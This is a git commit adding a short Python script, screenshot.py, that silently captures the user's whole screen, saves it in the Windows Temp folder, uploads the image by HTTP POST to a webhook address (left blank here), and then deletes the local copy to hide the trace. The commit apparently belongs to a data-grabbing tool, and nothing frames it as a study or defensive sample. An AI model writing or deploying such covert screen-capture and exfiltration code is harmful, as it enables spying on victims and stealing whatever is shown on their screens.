b43c31836ec5f687b6610002b326fd94035bbb9b
Lawxsz <116668706+Lawxsz@users.noreply.github.com>
2023-02-27 17:04:14 -0300

    Create screenshot.py

---
+++ scripts/screenshot.py
@@ -0,0 +1,16 @@
+import os.path, requests
+from PIL import ImageGrab
+
+user = os.path.expanduser("~")
+
+hook = ""
+
+captura = ImageGrab.grab()
+captura.save(user+"\\AppData\\Local\\Temp\\ss.png")
+
+file = {"file": open(user+"\\AppData\\Local\\Temp\\ss.png", "rb")}
+r = requests.post(hook, files=file)
+try:
+ os.remove(user+"\\AppData\\Local\\Temp\\ss.png")
+except:
+    pass
